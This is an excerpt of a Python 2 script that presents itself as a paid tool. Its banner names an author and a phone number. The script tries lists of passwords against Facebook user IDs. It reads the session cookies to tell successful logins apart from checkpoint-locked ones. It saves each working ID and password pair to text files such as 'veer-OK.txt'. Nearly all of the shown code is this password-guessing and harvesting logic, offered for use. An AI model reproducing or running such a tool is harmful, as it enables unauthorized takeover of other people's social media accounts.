...
logo = """'\x1b[0;37m'  
'\x1b[0;37m'    ____    ____  _______  _______ .______         
\   \  /   / |   ____||   ____||   _  \        
 \   \/   /  |  |__   |  |__   |  |_)  |       
  \      /   |   __|  |   __|  |      /        
   \    /    |  |____ |  |____ |  |\  \----.   
...
'\x1b[0;37m'   Author      :      Mudassir Ali-PAID
'\x1b[0;37m'   Github      :      Veerkoko  
'\x1b[0;37m'   FB ID       :      Veer Khanoo
'\x1b[0;37m'   TOOL TYPE   :         PAID TOOL
'\x1b[0;37m'   WAP NUMBER  :    +923439635677         
"""
dec="2"
server="2"
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[0;37m        Member In Mudassir Paid Commands ")
        ...
        os.system("xdg-open https://fb.me/Romachod")
        time.sleep(3)
        main_system()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[veer-OK] "+coc+user + " | " + pass1
                ok=open('Mudassir random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[0;37m[veer-CP] "+coc+user + " | " + pass1
                    cp=open('Mudassir random-cp.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From Mudassir : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[veer-OK] "+uid + " | " + pass1
                ok=open('veer-OK.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[0;37m[veer-CP] "+uid + " | " + pass1
                    cp=open('veer-CP.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;93m[veer-OK] "+uid + " | " + pass2
                        ok=open('veer-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[0;37m[veer-CP] "+uid + " | " + pass2
                            cp=open('veer-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;93m[veer-OK] "+uid + " | " + pass3
                                ok=open('veer-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[0;37m[veer-CP] "+uid + " | " + pass3
                                    cp=open('veer-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;93m[veer-OK] "+uid + " | " + pass4
                                        ok=open('veer-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[0;37m[veer-CP] "+uid + " | " + pass4
                                            cp=open('veer-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;93m[veer-OK] "+uid + " | " + pass5
                                                ok=open('veer-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[0;37m[veer-CP] "+uid + " | " + pass5
                                                    cp=open('veer-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;93m[veer-OK] "+uid + " | " + pass6
                                                        ok=open('veer-OK.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[0;37m[veer-CP] "+uid + " | " + pass6
                                                            cp=open('veer-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
